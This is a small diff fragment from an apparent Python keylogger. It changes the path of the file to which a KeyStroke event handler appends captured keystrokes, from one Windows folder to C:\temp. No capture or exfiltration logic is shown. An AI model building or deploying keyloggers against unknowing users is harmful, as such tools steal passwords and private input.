@@ -53,7 +53,7 @@ def get_current_process():
 
 def KeyStroke(event):
     global current_window
-    fileHandle = open ('C:\\pyworks\\before\\keylogger.txt', 'a' )
+    fileHandle = open ('C:\\temp\\keylogger.txt', 'a' )
 
     msg = ""
 
